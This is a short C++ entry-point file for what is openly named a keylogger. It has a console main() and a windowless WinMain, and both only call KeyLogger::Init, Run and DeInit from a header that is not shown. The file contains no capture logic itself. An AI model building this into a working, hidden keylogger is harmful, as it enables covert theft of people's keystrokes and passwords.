#include "KeyLogger.h"

#include <iostream>

#ifdef CONSOLE

int main()
{
	std::cout << "DSAKJLDJLKSA" << std::endl;
	KeyLogger::Init();
	KeyLogger::Run();
	KeyLogger::DeInit();

	return 0;
}

#else

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) 
{
	KeyLogger::Init();
	KeyLogger::Run();
	KeyLogger::DeInit();

	return 0;
}

#endif